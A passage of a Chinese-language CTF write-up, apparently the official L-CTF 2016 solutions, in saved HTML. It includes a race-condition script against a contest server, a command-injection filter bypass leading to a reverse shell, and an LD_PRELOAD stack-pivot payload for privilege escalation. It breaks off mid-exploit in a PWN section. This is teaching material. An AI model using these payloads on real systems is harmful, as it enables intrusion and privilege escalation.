style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">接下来需要知道token，而token是时间戳加上rand(1,10000)，那么就需要预测服务器上的时间戳然后爆破1-10000。预测时间戳的话有两种方法：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">1. 本地直接time()取，这样的话需要减去网络延时。网络状况不稳定的话就容易造成较大误差。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">2. 通过获取http头的date字段获取服务器的准确时间（GMT），这样的话需要确定`php.ini`的时区设置（北京时间是GMT+8），得到时间戳后爆破即可。这里有一个坑点是，一个回合只能有一个队伍可以重置管理员密码，所以需要通过脚本竞争来进入爆破环节。</span></p><p style="text-indent: 2em; text-align: left;"><br></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Web 500 盘加加</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">比较有趣的一个题目。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">首先是登陆的部分，由于管理员的注册逻辑有错，pwd忘记加上md5()，导致无法正常登陆。这时注意到找回密码的地方，为4位数字验证码，因此直接通过脚本爆破。进入到ucenter后其中的调试脚本功能需要余额为99999以上才能使用，而初始提供给了用户33333积分，可以以1:1的形式进行兑换。</span></p><p style="text-indent: 2em; text-align: center;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t01ae67cc6d9329500e.png" target="_blank"><img src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t01ae67cc6d9329500e.png" title="t0149a4bdfb0807fa7b.png" alt="http://p4.qhimg.com/t0149a4bdfb0807fa7b.png" style="visibility: visible;"></a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这里考察的是一个数据库不加锁情况下处理并发的业务逻辑问题，因此直接用时间竞争的方式，脚本多线程跑一下即可。脚本如下：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  python"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="python comments">#&nbsp;-*-&nbsp;coding:utf-8&nbsp;-*-</code></div><div class="line number2 index1 alt1"><code class="python keyword">import</code>&nbsp;<code class="python plain">requests</code></div><div class="line number3 index2 alt2"><code class="python keyword">from</code>&nbsp;<code class="python plain">time&nbsp;</code><code class="python keyword">import</code>&nbsp;<code class="python plain">sleep</code></div><div class="line number4 index3 alt1"><code class="python keyword">from</code>&nbsp;<code class="python plain">threading&nbsp;</code><code class="python keyword">import</code>&nbsp;<code class="python plain">Thread</code></div><div class="line number5 index4 alt2"><code class="python keyword">class</code>&nbsp;<code class="python plain">URLThread(Thread):</code></div><div class="line number6 index5 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">def</code>&nbsp;<code class="python plain">__init__(</code><code class="python color1">self</code><code class="python plain">,&nbsp;url,data,cookie,&nbsp;timeout</code><code class="python keyword">=</code><code class="python value">1</code><code class="python plain">,&nbsp;allow_redirects</code><code class="python keyword">=</code><code class="python color1">True</code><code class="python plain">):</code></div><div class="line number7 index6 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">super</code><code class="python plain">(URLThread,&nbsp;</code><code class="python color1">self</code><code class="python plain">).__init__()</code></div><div class="line number8 index7 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python color1">self</code><code class="python plain">.url&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">url</code></div><div class="line number9 index8 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python color1">self</code><code class="python plain">.timeout&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">timeout</code></div><div class="line number10 index9 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python color1">self</code><code class="python plain">.allow_redirects&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">allow_redirects</code></div><div class="line number11 index10 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python color1">self</code><code class="python plain">.response&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python color1">None</code></div><div class="line number12 index11 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python color1">self</code><code class="python plain">.data</code><code class="python keyword">=</code><code class="python plain">data</code></div><div class="line number13 index12 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python color1">self</code><code class="python plain">.cookies</code><code class="python keyword">=</code><code class="python plain">cookies</code></div><div class="line number14 index13 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">def</code>&nbsp;<code class="python plain">run(</code><code class="python color1">self</code><code class="python plain">):</code></div><div class="line number15 index14 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">try</code><code class="python plain">:</code></div><div class="line number16 index15 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python color1">self</code><code class="python plain">.response</code><code class="python keyword">=</code><code class="python plain">requests.post(</code><code class="python color1">self</code><code class="python plain">.url,timeout</code><code class="python keyword">=</code><code class="python color1">self</code><code class="python plain">.timeout,data</code><code class="python keyword">=</code><code class="python color1">self</code><code class="python plain">.data,cookies</code><code class="python keyword">=</code><code class="python color1">self</code><code class="python plain">.cookies)</code></div><div class="line number17 index16 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">text</code><code class="python keyword">=</code><code class="python color1">self</code><code class="python plain">.response.text</code></div><div class="line number18 index17 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">print</code>&nbsp;<code class="python plain">text</code></div><div class="line number19 index18 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">except</code>&nbsp;<code class="python plain">Exception&nbsp;,&nbsp;what:</code></div><div class="line number20 index19 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code>&nbsp;<code class="python plain">what</code></div><div class="line number21 index20 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">pass</code></div><div class="line number22 index21 alt1"><code class="python plain">num</code><code class="python keyword">=</code><code class="python value">10</code></div><div class="line number23 index22 alt2"><code class="python plain">data</code><code class="python keyword">=</code><code class="python plain">{</code><code class="python string">"count"</code><code class="python plain">:</code><code class="python string">"33332"</code><code class="python plain">}</code></div><div class="line number24 index23 alt1"><code class="python plain">cookies</code><code class="python keyword">=</code><code class="python plain">{</code><code class="python string">"username"</code><code class="python plain">:</code><code class="python string">"2|1:0|10:1475430892|8:username|16:bWF0aDFhc19yb290|061255e41481821c19b68f12ac86017ec07f5729ca8ddf9050b291dca75a5360"</code><code class="python plain">}</code></div><div class="line number25 index24 alt2"><code class="python plain">th</code><code class="python keyword">=</code><code class="python functions">list</code><code class="python plain">()</code></div><div class="line number26 index25 alt1"><code class="python keyword">for</code>&nbsp;<code class="python plain">i&nbsp;</code><code class="python keyword">in</code>&nbsp;<code class="python functions">range</code><code class="python plain">(num):</code></div><div class="line number27 index26 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">th.append(URLThread(</code><code class="python string">"http://119.28.15.75:9000/trans"</code><code class="python plain">,data,cookies))</code></div><div class="line number28 index27 alt1"><code class="python keyword">for</code>&nbsp;<code class="python plain">j&nbsp;</code><code class="python keyword">in</code>&nbsp;<code class="python plain">th:</code></div><div class="line number29 index28 alt2"><code class="python plain">j.start()</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">然后就可以开始调试脚本了。很明显，这里存在一个命令注入，但是限制了大部分的符号，只能使用|、空白、制表符、数字和字母。因此有两种方式绕过：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">1. 利用正则表达式匹配多行的问题,直接绕过</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">2. Wget10进制ip地址,然后通过302为其指定一个无后缀名的文件名</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">最后通过<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">python 文件名</span>执行命令，这个思路是从hitcon的某道题目过来的。最后反弹一个shell，发现权限为root，那么就直接开始审查web源码。在<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">route.py</span>的逻辑中，发现了内网的ip地址，也就是我们调试的脚本地址。用ssh隧道转发后进行访问，发现这其实是一个用php为基础的解释语言(其实就是替换)。在提供的example中找到了调用<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">require</span>的方法，试图包含<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">/self/proc/environ</span>是没有权限的，那么只能使用<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">eval</span>的方法，去执行一个<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">$_SERVER</span>变量，比如<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">x_forwarded_for</span>：</span></p><p style="text-indent: 2em; text-align: center;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t01f9295364ed8de9d1.jpg" target="_blank"><img src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t01f9295364ed8de9d1.jpg" title="t0171336847a012115f.jpg" alt="http://p3.qhimg.com/t0171336847a012115f.jpg" style="visibility: visible;"></a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">成功执行代码后，就可以执行system，反弹一个shell了：</span></p><p style="text-indent: 2em; text-align: center;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t0183150164bf0a00d8.png" target="_blank"><img src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t0183150164bf0a00d8.png" title="t015662afbdd2c73e92.png" alt="http://p8.qhimg.com/t015662afbdd2c73e92.png" style="visibility: visible;"></a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">最后在<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">/home/pwn</span>目录下发现了flag文件，但是直接读取仍然没有权限。分析同目录的<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">.note_pwn</span>，是一个本地提权的文件(<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">setgid</span>)，32位程序，很直接的栈溢出，通过<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">stack-pivoting</span>技巧转移<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">esp</span>到可控区域，然后执行这块区域上预先放置好的<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">rop-chain</span>即可，这块可控区域可利用设置<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">LD_PRELOAD</span>环境变量来获得：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  plain"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">ulimit&nbsp;-s&nbsp;unlimited</code></div><div class="line number2 index1 alt1"><code class="plain plain">export&nbsp;LD_PRELOAD=`python&nbsp;-c&nbsp;"print&nbsp;'A'*29&nbsp;+&nbsp;'\xa0\x5e\x63\x55'&nbsp;+&nbsp;'AAAA'&nbsp;+&nbsp;'\x8c\xea\x6d\x55'&nbsp;+&nbsp;'\x00'*0x8"`</code></div><div class="line number3 index2 alt2"><code class="plain plain">python&nbsp;-c&nbsp;"print&nbsp;'A'*0x28+'\xd0\x8e\x57\x55'"&nbsp;&gt;&nbsp;/tmp/payload</code></div><div class="line number4 index3 alt1"><code class="plain plain">cat&nbsp;/tmp/payload&nbsp;-&nbsp;|&nbsp;./note_pw</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">最终得到flag</span></p><p style="text-indent: 2em; text-align: left;"><br></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">PWN</span></strong></span></p><hr><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  python"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="python comments">#&nbsp;对zio的输入输出加了点函数，方便自己使用</code></div><div class="line number2 index1 alt1"><code class="python keyword">class</code>&nbsp;<code class="python plain">zio(</code><code class="python functions">object</code><code class="python plain">):</code></div><div class="line number3 index2 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#.....&nbsp;&nbsp;&nbsp;&nbsp;</code></div><div class="line number4 index3 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">def</code>&nbsp;<code class="python plain">w(</code><code class="python color1">self</code><code class="python plain">,&nbsp;s):</code></div><div class="line number5 index4 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python color1">self</code><code class="python plain">.write(s)</code></div><div class="line number6 index5 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">def</code>&nbsp;<code class="python plain">wl(</code><code class="python color1">self</code><code class="python plain">,&nbsp;s&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">''):</code></div><div class="line number7 index6 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code>&nbsp;<code class="python functions">isinstance</code><code class="python plain">(s,&nbsp;(</code><code class="python functions">int</code><code class="python plain">,&nbsp;</code><code class="python functions">long</code><code class="python plain">)):</code></div><div class="line number8 index7 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python color1">self</code><code class="python plain">.writeline(</code><code class="python functions">str</code><code class="python plain">(s))</code></div><div class="line number9 index8 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">else</code><code class="python plain">:</code></div><div class="line number10 index9 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python color1">self</code><code class="python plain">.writeline(s)</code></div><div class="line number11 index10 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">def</code>&nbsp;<code class="python plain">wls(</code><code class="python color1">self</code>&nbsp;<code class="python plain">,sequence):</code></div><div class="line number12 index11 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python color1">self</code><code class="python plain">.writelines(&nbsp;[</code><code class="python functions">str</code><code class="python plain">(i)&nbsp;</code><code class="python keyword">if</code>&nbsp;<code class="python functions">isinstance</code><code class="python plain">(i,&nbsp;(</code><code class="python functions">int</code><code class="python plain">,&nbsp;</code><code class="python functions">long</code><code class="python plain">))&nbsp;</code><code class="python keyword">else</code>&nbsp;<code class="python plain">i&nbsp;</code><code class="python keyword">for</code>&nbsp;<code class="python plain">i&nbsp;</code><code class="python keyword">in</code>&nbsp;<code class="python plain">sequence]&nbsp;)</code></div><div class="line number13 index12 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">def</code>&nbsp;<code class="python plain">r(</code><code class="python color1">self</code><code class="python plain">,&nbsp;size&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python color1">None</code><code class="python plain">,&nbsp;timeout&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python keyword">-</code><code class="python value">1</code><code class="python plain">):</code></div><div class="line number14 index13 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code>&nbsp;<code class="python color1">self</code><code class="python plain">.read(size,&nbsp;timeout)</code></div><div class="line number15 index14 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">def</code>&nbsp;<code class="python plain">rl(</code><code class="python color1">self</code><code class="python plain">,&nbsp;size&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python keyword">-</code><code class="python value">1</code><code class="python plain">):</code></div><div class="line number16 index15 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code>&nbsp;<code class="python color1">self</code><code class="python plain">.read_line(size)</code></div><div class="line number17 index16 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">def</code>&nbsp;<code class="python plain">rtl(</code><code class="python color1">self</code><code class="python plain">,&nbsp;pattern_list,&nbsp;timeout&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python keyword">-</code><code class="python value">1</code><code class="python plain">,&nbsp;searchwindowsize&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python color1">None</code><code class="python plain">):</code></div><div class="line number18 index17 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code>&nbsp;<code class="python color1">self</code><code class="python plain">.read_until(pattern_list,&nbsp;timeout,&nbsp;searchwindowsize)</code></div><div class="line number19 index18 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">def</code>&nbsp;<code class="python plain">w_af(</code><code class="python color1">self</code><code class="python plain">,&nbsp;pattern_list,&nbsp;s,&nbsp;timeout&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python keyword">-</code><code class="python value">1</code><code class="python plain">,&nbsp;searchwindowsize&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python color1">None</code><code class="python plain">):</code></div><div class="line number20 index19 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python color1">self</code><code class="python plain">.read_until(pattern_list,&nbsp;timeout,&nbsp;searchwindowsize)</code></div><div class="line number21 index20 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python color1">self</code><code class="python plain">.writeline(s)</code></div><div class="line number22 index21 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">def</code>&nbsp;<code class="python plain">wls_af(</code><code class="python color1">self</code><code class="python plain">,&nbsp;pattern_list,&nbsp;sequence,&nbsp;timeout&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python keyword">-</code><code class="python value">1</code><code class="python plain">,&nbsp;searchwindowsize&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python color1">None</code><code class="python plain">):</code></div><div class="line number23 index22 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python color1">self</code><code class="python plain">.read_until(pattern_list,&nbsp;timeout,&nbsp;searchwindowsize)</code></div><div class="line number24 index23 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python color1">self</code><code class="python plain">.writelines(&nbsp;[</code><code class="python functions">str</code><code class="python plain">(i)&nbsp;</code><code class="python keyword">if</code>&nbsp;<code class="python functions">isinstance</code><code class="python plain">(i,&nbsp;(</code><code class="python functions">int</code><code class="python plain">,&nbsp;</code><code class="python functions">long</code><code class="python plain">))&nbsp;</code><code class="python keyword">else</code>&nbsp;<code class="python plain">i&nbsp;</code><code class="python keyword">for</code>&nbsp;<code class="python plain">i&nbsp;</code><code class="python keyword">in</code>&nbsp;<code class="python plain">sequence]&nbsp;)</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br></span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">PWN100</span></strong></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Bugs</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">程序有非常简单粗暴的栈缓冲区溢出，可溢出<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">0x80</span>个字节</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Thinking</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">栈溢出，没有提供<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">libc</span>，利用方法很多，可以通过<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">got</span>表泄露<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">libc</span>，可以通过<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">DynELF</span>来泄露<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">libc</span>，然后<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">return-to-libc</span>，或者<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">return-to-dl-resolve</span></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">下面给出的两个exp，一个是我无聊测试一下之前写的手动泄露共享库函数的方法，具体方法可参考<a href="http://uaf.io/exploitation/misc/2016/04/02/Finding-Functions.html" _src="http://uaf.io/exploitation/misc/2016/04/02/Finding-Functions.html">http://uaf.io/exploitation/misc/2016/04/02/Finding-Functions.html</a></span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">这篇文章，另一个exp也是我无聊试的<span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em; color: rgb(255, 0, 0);">return-to-dl-resolve</span></span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Exploit</span></strong></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">re2libc</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  python"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 